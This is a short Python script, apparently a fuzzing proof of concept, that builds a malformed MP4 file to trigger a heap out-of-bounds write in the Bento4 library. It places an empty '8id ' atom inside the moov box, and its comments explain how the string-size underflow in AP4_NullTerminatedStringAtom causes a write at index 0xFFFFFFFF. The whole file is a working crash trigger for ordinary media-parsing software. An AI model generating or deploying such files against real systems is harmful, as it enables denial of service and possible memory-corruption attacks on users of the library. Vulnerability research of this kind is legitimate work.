import struct
import os

def make_box(box_type, data=b''):
    size = 8 + len(data)
    return struct.pack('>I4s', size, box_type) + data

# ftyp box
ftyp_data = b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
ftyp = make_box(b'ftyp', ftyp_data)

# The malicious 8id  atom: size=8, type='8id ', NO data
# This is exactly 8 bytes: \x00\x00\x00\x08\x38\x69\x64\x20
# When AP4_NullTerminatedStringAtom is constructed with size=8:
#   str_size = 8 - 8 = 0 (AP4_Size underflow on next step)
#   str = new AP4_Byte[0]   (zero-length allocation)
#   str[str_size-1] = '\0'  => str[0xFFFFFFFF] = '\0'  => heap OOB write
bad_atom = struct.pack('>I', 8) + b'\x38\x69\x64\x20'

# mvhd box (version 0, minimal valid)
# version(1) + flags(3) + creation_time(4) + modification_time(4) +
# timescale(4) + duration(4) + rate(4) + volume(2) + reserved(10) +
# matrix(36) + pre_defined(24) + next_track_id(4) = 100 bytes payload
mvhd_payload = struct.pack('>BBBB', 0, 0, 0, 0)  # version + flags
mvhd_payload += struct.pack('>IIII', 0, 0, 1000, 0)  # times + timescale + duration
mvhd_payload += struct.pack('>I', 0x00010000)  # rate = 1.0
mvhd_payload += struct.pack('>H', 0x0100)      # volume = 1.0
mvhd_payload += b'\x00' * 10                   # reserved
# unity matrix
mvhd_payload += struct.pack('>iiiiiiiii',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
mvhd_payload += b'\x00' * 24  # pre_defined
mvhd_payload += struct.pack('>I', 2)  # next_track_id
mvhd = make_box(b'mvhd', mvhd_payload)

# moov box containing mvhd + bad_atom
moov_data = mvhd + bad_atom
moov = make_box(b'moov', moov_data)

mp4 = ftyp + moov

out_path = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4FileCopier_h/vuln_001.mp4'
os.makedirs(os.path.dirname(out_path), exist_ok=True)
with open(out_path, 'wb') as f:
    f.write(mp4)
print(f"Written {len(mp4)} bytes to {out_path}")
